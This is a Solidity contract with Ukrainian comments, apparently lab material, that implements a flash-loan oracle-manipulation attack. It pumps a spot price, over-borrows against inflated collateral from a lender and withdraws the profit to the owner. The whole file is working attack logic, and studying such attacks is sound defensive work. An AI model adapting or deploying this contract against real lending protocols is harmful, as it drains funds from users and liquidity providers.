// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "./interfaces/IFlashLoan.sol";
import "./interfaces/IDexPool.sol";
import "./interfaces/IOracleLender.sol";

/// @title FlashLoanAttacker
/// @notice ЛИШЕ ДЛЯ ЛАБОРАТОРНОЇ. Симуляція анатомії атаки на спот-оракул:
///         1) позичити токен B миттєвою позикою;
///         2) обміняти B -> A у пулі: ціна A у спот-оракулі стрибає;
///         3) внести куплені A як заставу в кредитора і позичити максимум B за завищеною ціною;
///         4) повернути позику з комісією, решту залишити собі як прибуток.
/// @dev Якщо прибуток менший за комісію, require відкочує всю транзакцію (див. п. 9.2).
contract FlashLoanAttacker is Ownable, IFlashBorrower {
    using SafeERC20 for IERC20;

    IFlashLender public immutable provider;
    IDexPool public immutable pool;
    IOracleLender public immutable lender;
    IERC20 public immutable tokenA; // заставний актив
    IERC20 public immutable tokenB; // позичений актив

    constructor(address provider_, address pool_, address lender_, address tokenA_, address tokenB_)
    Ownable(msg.sender)
    {
        require(
            provider_ != address(0) && pool_ != address(0) && lender_ != address(0)
            && tokenA_ != address(0) && tokenB_ != address(0),
            "FlashLoanAttacker: zero address"
        );
        provider = IFlashLender(provider_);
        pool = IDexPool(pool_);
        lender = IOracleLender(lender_);
        tokenA = IERC20(tokenA_);
        tokenB = IERC20(tokenB_);
    }

    /// @notice Точка входу атаки: запитує миттєву позику, далі керування йде в executeOperation.
    function attack(uint256 loanAmount) external onlyOwner {
        provider.flashLoan(address(this), loanAmount, "");
    }

    /// @notice Коллбек кредитора: тут атакуючий тимчасово володіє позиченим капіталом.
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata
    ) external override {
        // Захист самого атакуючого: коллбек можна викликати лише з нашої транзакції.
        require(msg.sender == address(provider), "FlashLoanAttacker: caller is not provider");
        require(initiator == address(this), "FlashLoanAttacker: foreign initiator");
        require(token == address(tokenB), "FlashLoanAttacker: unexpected token");

        // 1. Маніпуляція ціною: масований продаж B за A обвалює B / завищує A у спот-ціні.
        tokenB.forceApprove(address(pool), amount);
        uint256 boughtA = pool.swapBForA(amount, 0);

        // 2. Куплені A вносимо як заставу в кредитора, що довіряє спот-ціні.
        tokenA.forceApprove(address(lender), boughtA);
        lender.depositCollateral(boughtA);

        // 3. Позичаємо максимум B під штучно завищену заставу.
        lender.borrow(lender.maxBorrowable(address(this)));

        // 4. Повернення позики з комісією; без прибутку — Revert усієї транзакції.
        uint256 owed = amount + fee;
        require(tokenB.balanceOf(address(this)) >= owed, "FlashLoanAttacker: attack unprofitable");
        tokenB.safeTransfer(msg.sender, owed);
    }

    /// @notice Виведення "вкраденого" прибутку (токен B) власнику.
    function withdrawProfit(address to) external onlyOwner {
        require(to != address(0), "FlashLoanAttacker: zero address");
        uint256 balance = tokenB.balanceOf(address(this));
        require(balance > 0, "FlashLoanAttacker: no profit");
        tokenB.safeTransfer(to, balance);
    }
}